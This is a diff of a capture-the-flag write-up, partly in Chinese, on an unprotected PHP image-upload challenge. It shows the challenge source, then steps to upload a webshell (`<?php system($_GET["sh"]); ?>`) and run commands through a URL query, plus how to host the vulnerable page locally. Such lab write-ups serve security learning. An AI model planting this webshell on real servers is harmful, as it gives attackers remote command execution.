@@ -12,9 +12,8 @@ date: 2023-01-31
 Challenge: http://h4ck3r.quest:9010
 
 ## Source code
-:::spoiler code
-```php!=
- <?php
+```php
+<?php
     if (isset($_GET['source'])) {
         highlight_file(__FILE__);
         exit;
@@ -42,10 +41,23 @@ Challenge: http://h4ck3r.quest:9010
     echo "<img src=\"images/${prefix}_${filename}\">";
 ?>
 ```
-:::
 
 There's no any protection. Therefore, upload `webshell` and get shell
 
 ## Exploit - `webshell`
-Payload: `<?php system($_GET["sh"]); ?>`
-`view-source:http://h4ck3r.quest:9010/images/09956fc7c4f424b0_simple.php?sh=cat%20../../../../flag`
+1. 直接上傳一個名為`webshell.php`的檔案，內容為`<?php system($_GET["sh"]); ?>`
+```bash
+$ touch webshell.php
+$ echo '<?php system($_GET["sh"]); ?>' > webshell.php
+```
+2. 傳送出去之後查看該圖片並且在query的地方寫command，Payload: 
+```bash
+http://h4ck3r.quest:9010/images/<filename>.php?sh=pwd
+```
+    
+## 如果想要deploy在localhost
+```bash
+$ touch index.php # 把上面的index都複製到index.php
+$ mkdir images
+$ php -S localhost:8000
+```
